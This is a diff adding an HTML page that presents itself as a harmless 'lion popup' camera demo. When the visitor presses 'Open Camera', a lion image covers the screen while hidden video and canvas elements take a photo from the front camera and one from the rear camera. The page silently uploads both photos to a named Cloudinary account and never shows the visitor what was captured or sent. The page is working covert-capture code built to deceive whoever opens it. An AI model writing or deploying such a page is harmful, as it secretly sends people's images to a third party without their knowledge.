@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lion Popup with Auto Camera</title>
+  <style>
+    /* Fullscreen Lion Popup Styles */
+    #popup {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #popup img {
+      max-width: 90%;
+      max-height: 80%;
+      border: 10px solid white;
+      border-radius: 12px;
+      box-shadow: 0 0 20px black;
+    }
+
+    button {
+      font-size: 18px;
+      padding: 10px 20px;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Button to trigger -->
+  <center>
+    <button onclick="startCapture()">Open Camera</button>
+  </center>
+
+  <!-- Lion Image Popup -->
+  <div id="popup" onclick="closePopup()">
+    <img src="https://res.cloudinary.com/rajeevoberai39/image/upload/v1752316990/y3mxrvnxlmfq633l5ov0.jpg" alt="Lion Image">
+  </div>
+
+  <!-- Hidden camera elements -->
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const popup = document.getElementById("popup");
+
+    // Show popup on camera start
+    function showPopup() {
+      popup.style.display = "flex";
+      setTimeout(closePopup, 3000); // auto-close after 3 sec
+    }
+
+    function closePopup() {
+      popup.style.display = "none";
+    }
+
+    async function captureFromCamera(mode) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: mode } }
+        });
+
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => resolve();
+        });
+
+        // Capture image from stream
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        // Stop camera
+        stream.getTracks().forEach(track => track.stop());
+
+        // Upload to Cloudinary
+        canvas.toBlob(async function(blob) {
+          const formData = new FormData();
+          formData.append("file", blob, "photo.jpg");
+          formData.append("upload_preset", "photo_upload");
+
+          const res = await fetch("https://api.cloudinary.com/v1_1/rajeevoberai39/image/upload", {
+            method: "POST",
+            body: formData
+          });
+
+          const data = await res.json();
+          console.log(`✅ Uploaded (${mode}):`, data.secure_url);
+        }, "image/jpeg");
+
+      } catch (err) {
+        console.error(`❌ ${mode} camera error:`, err.message);
+      }
+    }
+
+    async function startCapture() {
+      showPopup(); // show lion image popup
+
+      await captureFromCamera("user");         // Front camera
+      await captureFromCamera("environment");  // Back camera
+    }
+  </script>
+</body>
+</html>
